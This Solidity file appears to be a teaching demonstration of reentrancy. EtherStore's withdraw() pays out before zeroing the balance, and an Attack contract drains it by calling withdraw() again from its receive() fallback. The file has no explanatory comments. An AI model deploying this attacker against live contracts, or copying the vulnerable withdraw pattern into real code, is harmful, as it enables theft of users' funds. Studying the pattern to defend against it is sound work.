// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;
contract EtherStore {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

}
contract Attack {
    EtherStore public etherstore;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address etherStoreAddress) {
        etherstore = EtherStore(etherStoreAddress);
    }

    receive() external payable {
        if (address(etherstore).balance >= AMOUNT) {
            etherstore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        etherstore.deposit{value: AMOUNT}();
        etherstore.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

